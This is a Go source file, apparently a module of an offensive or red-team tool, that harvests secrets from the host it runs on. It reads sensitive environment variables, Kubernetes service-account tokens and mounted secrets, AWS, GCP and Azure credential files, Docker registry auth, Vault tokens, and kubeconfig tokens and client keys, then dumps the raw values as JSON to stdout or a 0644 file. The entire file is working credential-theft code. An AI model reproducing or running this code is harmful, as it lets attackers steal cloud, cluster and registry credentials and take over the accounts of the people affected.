package secrets

import (
	"bufio"
	"encoding/json"
	"fmt"
	"os"
	"path/filepath"
	"regexp"
	"strings"
)

type HarvestResult struct {
	Source  string        `json:"source"`
	Secrets []SecretItem  `json:"secrets"`
	Errors  []string      `json:"errors,omitempty"`
}

type SecretItem struct {
	Source string `json:"source"`
	Type   string `json:"type"`
	Key    string `json:"key"`
	Value  string `json:"value"`
	Path   string `json:"path,omitempty"`
}

var sensitiveEnvPattern = regexp.MustCompile(`(?i)(key|token|secret|password|api_key|apikey|auth|credential|private)`)

func Harvest(sources, output string) error {
	var results []HarvestResult

	sourceList := parseSources(sources)

	for _, src := range sourceList {
		switch src {
		case "env":
			results = append(results, harvestEnv())
		case "k8s":
			results = append(results, harvestK8sMounted())
		case "cloud":
			results = append(results, harvestCloudConfigs())
		case "docker":
			results = append(results, harvestDockerConfig())
		case "vault":
			results = append(results, harvestVaultToken())
		case "kubeconfig":
			results = append(results, harvestKubeconfig())
		}
	}

	data, _ := json.MarshalIndent(results, "", "  ")
	if output != "" {
		return os.WriteFile(output, data, 0644)
	}
	fmt.Println(string(data))
	return nil
}

func parseSources(sources string) []string {
	if sources == "all" || sources == "" {
		return []string{"env", "k8s", "cloud", "docker", "vault", "kubeconfig"}
	}
	return strings.Split(sources, ",")
}

func harvestEnv() HarvestResult {
	result := HarvestResult{Source: "environment"}
	for _, env := range os.Environ() {
		parts := strings.SplitN(env, "=", 2)
		if len(parts) != 2 {
			continue
		}
		key, val := parts[0], parts[1]
		if sensitiveEnvPattern.MatchString(key) && val != "" {
			result.Secrets = append(result.Secrets, SecretItem{
				Source: "env",
				Type:   "environment_variable",
				Key:    key,
				Value:  val,
			})
		}
	}
	return result
}

func harvestK8sMounted() HarvestResult {
	result := HarvestResult{Source: "k8s_mounted"}
	saPath := "/var/run/secrets/kubernetes.io/serviceaccount"

	files := []struct {
		name string
		typ  string
	}{
		{"token", "service_account_token"},
		{"ca.crt", "ca_certificate"},
		{"namespace", "namespace"},
	}

	for _, f := range files {
		path := filepath.Join(saPath, f.name)
		data, err := os.ReadFile(path)
		if err != nil {
			continue
		}
		result.Secrets = append(result.Secrets, SecretItem{
			Source: "k8s",
			Type:   f.typ,
			Key:    f.name,
			Value:  strings.TrimSpace(string(data)),
			Path:   path,
		})
	}

	// scan for additional mounted secrets
	secretsDir := "/var/run/secrets"
	_ = filepath.Walk(secretsDir, func(path string, info os.FileInfo, err error) error {
		if err != nil || info.IsDir() {
			return nil
		}
		if strings.Contains(path, "serviceaccount") {
			return nil
		}
		data, err := os.ReadFile(path)
		if err != nil {
			return nil
		}
		result.Secrets = append(result.Secrets, SecretItem{
			Source: "k8s",
			Type:   "mounted_secret",
			Key:    filepath.Base(path),
			Value:  strings.TrimSpace(string(data)),
			Path:   path,
		})
		return nil
	})

	return result
}

func harvestCloudConfigs() HarvestResult {
	result := HarvestResult{Source: "cloud_configs"}
	home := homeDir()

	paths := []struct {
		path string
		typ  string
	}{
		{filepath.Join(home, ".aws", "credentials"), "aws_credentials"},
		{filepath.Join(home, ".aws", "config"), "aws_config"},
		{filepath.Join(home, ".config", "gcloud", "application_default_credentials.json"), "gcp_adc"},
		{filepath.Join(home, ".azure", "accessTokens.json"), "azure_tokens"},
		{filepath.Join(home, ".azure", "azureProfile.json"), "azure_profile"},
	}

	for _, p := range paths {
		data, err := os.ReadFile(p.path)
		if err != nil {
			continue
		}
		result.Secrets = append(result.Secrets, SecretItem{
			Source: "cloud",
			Type:   p.typ,
			Key:    filepath.Base(p.path),
			Value:  string(data),
			Path:   p.path,
		})
	}

	return result
}

func harvestDockerConfig() HarvestResult {
	result := HarvestResult{Source: "docker"}
	home := homeDir()

	paths := []string{
		filepath.Join(home, ".docker", "config.json"),
		filepath.Join(home, ".dockercfg"),
	}

	for _, p := range paths {
		data, err := os.ReadFile(p)
		if err != nil {
			continue
		}
		result.Secrets = append(result.Secrets, SecretItem{
			Source: "docker",
			Type:   "registry_auth",
			Key:    filepath.Base(p),
			Value:  string(data),
			Path:   p,
		})
	}

	return result
}

func harvestVaultToken() HarvestResult {
	result := HarvestResult{Source: "vault"}
	home := homeDir()

	if token := os.Getenv("VAULT_TOKEN"); token != "" {
		result.Secrets = append(result.Secrets, SecretItem{
			Source: "vault",
			Type:   "vault_token",
			Key:    "VAULT_TOKEN",
			Value:  token,
		})
	}

	tokenPath := filepath.Join(home, ".vault-token")
	if data, err := os.ReadFile(tokenPath); err == nil {
		result.Secrets = append(result.Secrets, SecretItem{
			Source: "vault",
			Type:   "vault_token_file",
			Key:    ".vault-token",
			Value:  strings.TrimSpace(string(data)),
			Path:   tokenPath,
		})
	}

	return result
}

func harvestKubeconfig() HarvestResult {
	result := HarvestResult{Source: "kubeconfig"}
	home := homeDir()

	kubeconfigPath := os.Getenv("KUBECONFIG")
	if kubeconfigPath == "" {
		kubeconfigPath = filepath.Join(home, ".kube", "config")
	}

	data, err := os.ReadFile(kubeconfigPath)
	if err != nil {
		return result
	}

	result.Secrets = append(result.Secrets, SecretItem{
		Source: "kubeconfig",
		Type:   "kubeconfig",
		Key:    "config",
		Value:  string(data),
		Path:   kubeconfigPath,
	})

	// extract tokens/certs from kubeconfig
	scanner := bufio.NewScanner(strings.NewReader(string(data)))
	for scanner.Scan() {
		line := strings.TrimSpace(scanner.Text())
		if val, ok := strings.CutPrefix(line, "token:"); ok {
			result.Secrets = append(result.Secrets, SecretItem{
				Source: "kubeconfig",
				Type:   "bearer_token",
				Key:    "token",
				Value:  strings.TrimSpace(val),
				Path:   kubeconfigPath,
			})
		}
		if val, ok := strings.CutPrefix(line, "client-certificate-data:"); ok {
			result.Secrets = append(result.Secrets, SecretItem{
				Source: "kubeconfig",
				Type:   "client_cert",
				Key:    "client-certificate-data",
				Value:  strings.TrimSpace(val),
				Path:   kubeconfigPath,
			})
		}
		if val, ok := strings.CutPrefix(line, "client-key-data:"); ok {
			result.Secrets = append(result.Secrets, SecretItem{
				Source: "kubeconfig",
				Type:   "client_key",
				Key:    "client-key-data",
				Value:  strings.TrimSpace(val),
				Path:   kubeconfigPath,
			})
		}
	}

	return result
}

func homeDir() string {
	if h := os.Getenv("HOME"); h != "" {
		return h
	}
	return os.Getenv("USERPROFILE")
}
